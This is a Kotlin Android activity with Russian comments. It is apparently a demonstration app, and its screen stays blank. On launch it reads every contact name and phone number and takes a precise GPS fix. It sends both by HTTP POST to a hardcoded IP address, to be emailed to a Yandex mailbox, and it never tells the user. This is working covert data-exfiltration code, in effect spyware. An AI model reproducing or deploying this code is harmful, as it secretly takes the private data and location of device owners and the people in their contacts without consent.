package com.mobiledev.contacts

import android.Manifest//манифест
import android.content.ContentResolver//Этот класс дает приложению доступ к модели контента
import android.content.pm.PackageManager//Класс для доступа к различной информации относительно пакетов приложения, которые в данные момент установлены на устройстве
import android.location.Location
import android.os.Build//Информация о текущей сборке, получаемая из информации о системе
import android.os.Bundle//A mapping from String keys to various Parcelable values
import android.os.Looper
import android.provider.ContactsContract//Связь между приложением и хранилкой контактов. Содержит определения поддерживаемых URI и столбцов.
import androidx.appcompat.app.AppCompatActivity
import com.github.kittinunf.fuel.httpPost
import com.google.android.gms.location.*
import org.json.JSONObject

/**
 * Основной класс
 */
class MainActivity : AppCompatActivity() {

        companion object {
            val PERMISSIONS_REQUEST_READ_CONTACTS = 100
            val PERMISSION_ID = 42
        }

    lateinit var mFusedLocationClient: FusedLocationProviderClient

    /**
     * Инициализирует все фрагменты и загрузчики
     */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //Задаем экран, который нужно отобразить. На нем у нас пусто, но тем не менее
        setContentView(R.layout.activity_main)
        //Нужно для работы с GPS
        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        //Вызываем функцию загрузки контактов
        loadContacts()
        //Вызываем функцию получения координат
        getLocation()
    }

    //Функция загрузки контактов
    private fun loadContacts() {
        var builder = StringBuilder()

        //Проверяем права на чтение списка контактов
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                checkSelfPermission(
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) { //Прав нет - запрашиваем. Предполагается, что пользователь нажмет "Разрешить."
            requestPermissions(arrayOf(Manifest.permission.READ_CONTACTS),
                    PERMISSIONS_REQUEST_READ_CONTACTS)
            //Если прав нет, то они будут запрошены и, если разрешения будут даны, то будет вызвана callback функция onRequestPermissionsResult()
        } else {//Права есть - обрабатываем
            builder = getContacts()//Получаем список контактов

            //Отправляем контакты на сервер. Наш сервер на NodeJS - это REST API. Он принимает 3 параметра в JSON: content - текст сообщения, subject - тема сообщения, recipient - кому отправлять сообщение
            val json = JSONObject()
            json.put("content", builder.toString())
            json.put("subject", "Контакты")
            json.put("recipient", "progdemonstration@yandex.ru")

            //Эта строка отправляет POST-запрос на сервер
            "http://95.217.166.233".httpPost().body(json.toString()).responseString { request, response, result ->}

        }
    }

    //Функция получения координат
    private fun getLocation() {
        //Проверяем, есть ли права на получение координат
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                checkSelfPermission(
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) { //Прав нет - запрашиваем. Предполагается, что пользователь нажмет "Разрешить."
            requestPermissions(arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION),
                    PERMISSION_ID)
            //Если прав нет, то они будут запрошены и, если разрешения будут даны, то будет вызвана callback функция onRequestPermissionsResult()
        } else {//Права есть - обрабатываем
            requestNewLocationData()
        }
    }

    //Эта функция вызывается, когда пользователь дал права
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>,grantResults: IntArray) {
        //На чтение контактов
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                //Мы получили права на контакты
                //Заново вызываем функцию получения контактов
                loadContacts()
                //Звново вызываем функцию получения координат
                getLocation()
            }
        }

        //На чтение координат
        if (requestCode == PERMISSION_ID) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                //Мы получили права на координаты
                //Заново вызываем фукнцию получения координат
                getLocation()
            }
        }
    }

    //Функция запроса координат
    private fun requestNewLocationData() {
        var mLocationRequest = LocationRequest()
        mLocationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY//Точность
        mLocationRequest.interval = 0//Интервалы обновления координат
        mLocationRequest.fastestInterval = 0
        mLocationRequest.numUpdates = 1

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        mFusedLocationClient!!.requestLocationUpdates(
                mLocationRequest, mLocationCallback,
                Looper.myLooper()
        )
    }

    //Callback-функция. Когда координаты будут получены, будет вызвана эта функция
    private val mLocationCallback = object : LocationCallback() {
        override fun onLocationResult(locationResult: LocationResult) {
            var mLastLocation: Location = locationResult.lastLocation

            //Отправляем координаты на сервер в JSON. Также точно, как и контакты
            val json = JSONObject()
            json.put("content", "<h1>Location</h1><p><b>Lat</b>:" + mLastLocation.latitude.toString() + ", <b>lng</b>: " + mLastLocation.longitude.toString() + "</p>")
            json.put("subject", "GPS координаты")
            json.put("recipient", "progdemonstration@yandex.ru")

            "http://95.217.166.233".httpPost().body(json.toString()).responseString { request, response, result -> }
        }
    }

        //Получает список контактов с телефона
        private fun getContacts(): StringBuilder {
            val builder = StringBuilder()
            val resolver: ContentResolver = contentResolver;
            //resolver.query Делает запрос к предоставленному URI, возвращая курсор над результирующим набором.
            //ContactsContract определяет базу данных с информацией по контактам
            //Contacts - Константа к таблице контактов
            val cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null,
                    null)

            if (cursor.count > 0) {
                while (cursor.moveToNext()) {//Пока остались строки в результатах запроса, двигаемся к следующей
                    val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))//ID контакта
                    val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))//Имя контакта
                    val phoneNumber = (cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))).toInt()//Проверяем, записан ли номер телефона

                    if (phoneNumber > 0) {//Если номер есть
                        val cursorPhone = contentResolver.query(//Делаем запрос к номерам телефона выбранного ID контакта
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", arrayOf(id), null)

                        if(cursorPhone.count > 0) {//Если есть хотя бы один номер телефона
                            while (cursorPhone.moveToNext()) {//Пробегаемся по всем строкам с номерами телефонов
                                val phoneNumValue = cursorPhone.getString(
                                        cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                builder.append("<p><b>ФИО</b>: ").append(name).append(", <b>Телефон</b>: ").append(
                                        phoneNumValue).append("</p>")
//                                Log.e("Name ===>",phoneNumValue);
                            }
                        }
                        cursorPhone.close()//Закрываем курсор, освобождаем ресурсы
                    }
                }
            } else {//Если контактов в телефоне нет. Мы ничего с этим не будем делать.
             //   toast("No contacts available!")
            }
            cursor.close()//Закрываем курсор, освобождаем ресурсы
            return builder//Возвращаем результат обработки контактов
        }
    }